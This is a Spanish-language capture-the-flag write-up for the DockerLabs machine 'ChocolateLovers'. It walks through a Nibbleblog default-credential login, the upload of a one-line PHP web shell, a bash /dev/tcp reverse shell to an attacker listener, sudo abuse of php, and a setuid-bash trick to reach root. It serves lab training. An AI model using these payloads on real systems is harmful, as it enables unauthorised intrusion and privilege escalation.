Máquina ChocolateLovers - Fácil

Reconocimiento con nmap:

```
# Nmap 7.94SVN scan initiated Wed May 15 09:12:59 2024 as: nmap -p- --open -sS -sCV --min-rate 5000 -vvv -n -Pn -oN Target 172.17.0.2
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000060s latency).
Scanned at 2024-05-15 09:13:00 CEST for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 15 09:13:07 2024 -- 1 IP address (1 host up) scanned in 7.52 seconds
```

Vemos una página por defecto de apache, fuzzeo, no hay, le doy contrl+u y me encuentro la ruta que hay que seguir: /nibbleblog

# Explotación Web

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/468f1c95-0feb-446f-a01e-9e56a6a221d4)

En la ruta admin.php encontramos un panel de login, vemos que del cms nibbleblog las credenciales por defecto son admin:admin 


![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/605f0b7b-db64-4e89-a50e-81624aae0f9e)


Buscamos vulnerabilidades:


![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/4edb682a-8140-4513-b6a6-19c5e5d99319)

Encontramos una sql y un file upload con metasploit, he estado leyendo el script de metasploit, y vamos a hacerlo manualmente:

Entramos en el apartado del plugin my imagen, y subimos un backdoor

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/6f3f206c-538f-4195-99b6-f0dfb051a6d2)

```
<?php
        system($_GET['cmd'])
?>
```

lo metemos donde pone browser y lo subimos, y ya tendriamos un rce:ç

(script que he leido para la explotacion: https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py)


![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/8904f665-d7af-40ee-9016-32b41aa196c4)

Ahora una simple reverse shell y ya estariamos dentro

```
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261" # Máquina víctima
nc -nlvp 443 # Máquina atacante
```

# Escalada de privilegios

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/9c63597e-3a67-4950-ba81-0c00e8e3c9e9)

Primero tratamiento de la tty:

```
script /dev/null -c bash
{ctrl+z}

stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash

stty size # ver en mi pantalla
stty rows 47 columns 210
```

Ejecutamos sudo -l y vemos que esta php, pero solo es para el usuario chocolate:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/d673dc05-805f-45d3-89c8-ba132dfc2c22)

Vemos desde searchbins que es lo que hay que hacer:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/a4cab2d4-089b-4d20-8582-53045dcd1e49)

y ejecutamos:

```
CMD="/bin/bash"
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/661b36b9-b887-438a-9c3f-5d5216209db2)

encontramos el script /opt/script.php:

```
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

entonces ya ejecutamos el comando bash -p y conseguimos root





